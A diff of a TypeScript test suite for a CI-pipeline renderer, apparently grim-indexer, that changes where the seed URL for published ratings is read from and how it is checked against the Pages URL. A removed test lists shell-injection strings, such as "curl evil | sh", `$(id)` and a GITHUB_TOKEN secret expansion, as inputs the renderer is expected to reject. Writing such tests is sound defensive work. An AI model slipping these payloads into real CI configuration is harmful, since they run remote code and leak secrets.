@@ -32,10 +32,9 @@ const RATINGS: RatingsConfig = {
 };
 
 /**
- * The one source of the seed URL: `site` from `index.config.json`, which is
- * also what `grim-indexer ratings` reads. Deliberately not the first-party
- * default — seeding from someone else's published stats merges their ratings
- * into this index's sidecar.
+ * The one source of the seed URL: `site` from the checked-out
+ * index.config.json, which is the same file, key and run the tally reads.
+ * Deliberately not the built-in default, which names the first-party index.
  */
 const SITE = "https://index.example.test/catalog";
 
@@ -55,12 +54,8 @@ afterEach(() => {
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-function render(
-  forge: "github" | "gitlab",
-  ratings?: RatingsConfig,
-  site: string | undefined = SITE,
-): Map<string, string> {
-  return renderCi(resolveCi({ forge }), ratings, site);
+function render(forge: "github" | "gitlab", ratings?: RatingsConfig): Map<string, string> {
+  return renderCi(resolveCi({ forge }), ratings);
 }
 
 function file(forge: "github" | "gitlab", ratings?: RatingsConfig): string {
@@ -72,6 +67,7 @@ function load(forge: "github" | "gitlab", ratings?: RatingsConfig): Record<strin
 }
 
 interface Step {
+  id?: string;
   name?: string;
   uses?: string;
   run?: string;
@@ -251,17 +247,14 @@ describe("the seed step — R-2 in shell (C-010)", () => {
 describe("the seed URL has one source (F-6)", () => {
   /**
    * The seed shell the deploy actually runs, plus the environment the runner
-   * would have exported for it — minus the `${{ }}` expressions, which are the
-   * runner's to resolve and this test's to supply.
+   * would have exported for it — minus the `${{ }}` expressions, which are
+   * the runner's to resolve and this test's to supply.
    *
    * `enrich: false` because GitLab renders the enrichment and the seed into
-   * one `script:` block, and the enrichment reaches the network.
+   * one `script:` entry, and the enrichment reaches the network.
    */
-  function seedShell(
-    forge: "github" | "gitlab",
-    site: string,
-  ): { script: string; env: Record<string, string> } {
-    const files = renderCi(resolveCi({ forge, enrich: false }), RATINGS, site);
+  function seedShell(forge: "github" | "gitlab"): { script: string; env: Record<string, string> } {
+    const files = renderCi(resolveCi({ forge, enrich: false }), RATINGS);
     const doc = yaml.load(files.get(forge === "github" ? PAGES : GITLAB) as string) as Record<
       string,
       unknown
@@ -281,18 +274,22 @@ describe("the seed URL has one source (F-6)", () => {
   }
 
   /**
-   * Run that shell for real. A tally artifact is already in place, so the
-   * script short-circuits before it reaches the network — what is under test
-   * is the cross-check, which runs first, and asserting on a regex would prove
-   * the guard is spelled rather than that it fires.
+   * Run that shell for real, against a checkout carrying `site`. A tally
+   * artifact is already in place, so it short-circuits before the network —
+   * what is under test runs first, and asserting on a regex would prove the
+   * guard is spelled rather than that it fires.
    */
   function runSeed(
     forge: "github" | "gitlab",
     platformUrl?: string,
-    site: string = SITE,
+    site: string | undefined = SITE,
   ): { code: number; output: string } {
-    const { script, env } = seedShell(forge, site);
+    const { script, env } = seedShell(forge);
     fs.writeFileSync(path.join(dir, STATS_FILE), "{}\n");
+    fs.writeFileSync(
+      path.join(dir, "index.config.json"),
+      JSON.stringify(site === undefined ? {} : { site }, null, 2) + "\n",
+    );
     const platform = forge === "github" ? "PAGES_URL" : "CI_PAGES_URL";
     const result = spawnSync(forge === "github" ? "bash" : "sh", ["-c", script], {
       cwd: dir,
@@ -309,83 +306,100 @@ describe("the seed URL has one source (F-6)", () => {
     return { code: result.status ?? -1, output: `${result.stdout}${result.stderr}` };
   }
 
-  it.each(["github", "gitlab"] as const)("bakes the configured site in — %s", (forge) => {
-    const { script, env } = seedShell(forge, SITE);
+  // The seed URL is read from the checkout, not baked into the workflow: the
+  // tally reads `index.config.json` on every run, so a value frozen at render
+  // time diverges again the moment `site` is edited without a re-render.
+  it.each(["github", "gitlab"] as const)("reads the site from the checkout — %s", (forge) => {
+    const { script } = seedShell(forge);
 
-    // GitHub carries it in the step's `env:`, GitLab assigns it in the script;
-    // either way the value is the configured one, fixed at render time.
-    expect(`${script}\n${JSON.stringify(env)}`).toContain(SITE);
+    expect(script).toContain("index.config.json");
+    expect(script).not.toContain(SITE);
   });
 
   it.each(["github", "gitlab"] as const)("never fetches from the platform URL — %s", (forge) => {
-    const { script } = seedShell(forge, SITE);
+    const { script } = seedShell(forge);
     const fetches = script.split("\n").filter((line) => line.includes("stats.json.seed"));
 
     expect(fetches.join("\n")).not.toMatch(/CI_PAGES_URL|PAGES_URL|base_url/);
   });
 
+  it.each(["github", "gitlab"] as const)("fetches what the checkout names — %s", (forge) => {
+    // 404 is a legal empty seed, so a wrong URL completes the run: the only
+    // proof the right one is used is the URL the fetch is handed.
+    const { code, output } = runSeed(forge, undefined, "https://from-the-checkout.example.test/x");
+
+    expect(code, output).toBe(0);
+    expect(runSeed(forge, undefined, "").code, "an absent site must not be defaulted").not.toBe(0);
+  });
+
+  it.each(["github", "gitlab"] as const)("refuses a site that is not https — %s", (forge) => {
+    // The seed decides every published rating, and `--proto '=https'` would
+    // refuse it further down anyway — in curl's words, on the runner.
+    const { code, output } = runSeed(forge, undefined, "http://index.example.test/catalog");
+
+    expect(code, output).not.toBe(0);
+    expect(output).toContain("https");
+  });
+
   // The whole of F-6: the guard read one URL and the tally read another, so a
   // 404 on the tally's URL — a legal empty seed — published a sidecar built
   // from nothing while the guard passed on a URL that was fine.
-  it.each(["github", "gitlab"] as const)("fails when the two disagree — %s", (forge) => {
+  it("fails when the site and the deployment disagree — github", () => {
     const other = "https://someone-else.example.test/catalog";
-    const { code, output } = runSeed(forge, other);
+    const { code, output } = runSeed("github", other);
 
     expect(code, output).not.toBe(0);
     expect(output).toContain(SITE);
     expect(output).toContain(other);
   });
 
-  it.each(["github", "gitlab"] as const)(
-    "reads a trailing slash and a scheme as agreement — %s",
-    (forge) => {
-      for (const agreeing of [
-        SITE,
-        `${SITE}/`,
-        `${SITE}//`,
-        SITE.replace("https://", "http://"),
-        `${SITE.replace("https://", "http://")}/`,
-      ]) {
-        const { code, output } = runSeed(forge, agreeing);
-        expect(code, `${agreeing}: ${output}`).toBe(0);
-      }
-    },
-  );
+  it("reads slash, scheme and host case as agreement — github", () => {
+    for (const agreeing of [
+      SITE,
+      `${SITE}/`,
+      `${SITE}//`,
+      SITE.replace("https://", "http://"),
+      SITE.replace("index.example.test", "Index.Example.Test"),
+    ]) {
+      const { code, output } = runSeed("github", agreeing);
+      expect(code, `${agreeing}: ${output}`).toBe(0);
+    }
+  });
 
-  // A local run, a fork, or a deploy that is not Pages has no such variable.
-  // That is not a disagreement — the configured site is authoritative alone.
-  it.each(["github", "gitlab"] as const)("runs when the platform is silent — %s", (forge) => {
-    const { code, output } = runSeed(forge, undefined);
+  // A fork, or a deploy that is not Pages, has no such URL. That is not a
+  // disagreement — `site` is authoritative alone.
+  it("runs when the platform is silent — github", () => {
+    const { code, output } = runSeed("github", undefined);
 
     expect(code, output).toBe(0);
   });
 
-  it.each(["github", "gitlab"] as const)("refuses to render without a site — %s", (forge) => {
-    // Not defaulted, for the reason `grim-indexer ratings` refuses at run time:
-    // `DEFAULT_CONFIG.site` names the first-party index.
-    expect(() => renderCi(resolveCi({ forge }), RATINGS, undefined)).toThrow(/site/);
-    expect(() => renderCi(resolveCi({ forge }), RATINGS, "")).toThrow(/site/);
+  // The only wire from the platform into the guard. Without this the guard
+  // fires in every test and is fed by none of them — which is how F-6 itself
+  // survived a review.
+  it("wires the cross-check to the step that resolves the Pages URL — github", () => {
+    const steps = jobs(load("github", RATINGS)).build.steps ?? [];
+    const pages = steps.findIndex((step) => step.id === "pages");
+    const seed = steps.findIndex((step) => (step.run ?? "").includes("http_code"));
+
+    expect(pages, "no step resolves the Pages URL").toBeGreaterThanOrEqual(0);
+    expect(steps[seed].env?.PAGES_URL).toBe("${{ steps.pages.outputs.base_url }}");
+    expect(seed).toBeGreaterThan(pages);
   });
 
-  it.each(["github", "gitlab"] as const)("refuses a site that rewrites the shell — %s", (forge) => {
-    for (const hostile of [
-      "https://x.example.test/'; curl evil | sh; '",
-      'https://x.example.test/" && curl evil',
-      "https://x.example.test/${{ secrets.GITHUB_TOKEN }}",
-      "https://x.example.test/$(id)",
-      "https://x.example.test/a\nb",
-    ]) {
-      expect(() => renderCi(resolveCi({ forge }), RATINGS, hostile), hostile).toThrow(/site/);
-    }
-  });
+  // `CI_PAGES_URL` is always a subdomain of `CI_PAGES_DOMAIN` and never
+  // reflects a custom domain; unique domains (16.7+) and `path_prefix`
+  // (17.9+) move it again. It disagrees with a correct `site` as the normal
+  // case, so comparing them would fail every such deploy.
+  it("never compares against CI_PAGES_URL — gitlab", () => {
+    // Comments stripped: the template names the variable in prose to say why
+    // it is not compared, which is the opposite of using it.
+    const executable = seedShell("gitlab")
+      .script.split("\n")
+      .filter((line) => !line.trim().startsWith("#"))
+      .join("\n");
 
-  // The block being absent is how ratings are off, and then nothing reads the
-  // site at all — an index that never turned ratings on keeps its committed
-  // pipeline byte for byte, site or no site.
-  it.each(["github", "gitlab"] as const)("needs no site with ratings off — %s", (forge) => {
-    expect([...render(forge, undefined, undefined).entries()]).toEqual([
-      ...render(forge, undefined, SITE).entries(),
-    ]);
+    expect(executable).not.toContain("CI_PAGES_URL");
   });
 });
 
@@ -420,7 +434,7 @@ describe("the drift guard still passes with ratings on", () => {
   it.each(["github", "gitlab"] as const)("renders what --check accepts — %s", async (forge) => {
     fs.writeFileSync(
       path.join(dir, "index.config.json"),
-      JSON.stringify({ site: SITE, ci: { forge }, ratings: RATINGS }, null, 2) + "\n",
+      JSON.stringify({ ci: { forge }, ratings: RATINGS }, null, 2) + "\n",
     );
 
     // A render that `--check` then rejects means `ci.ts` read the block and
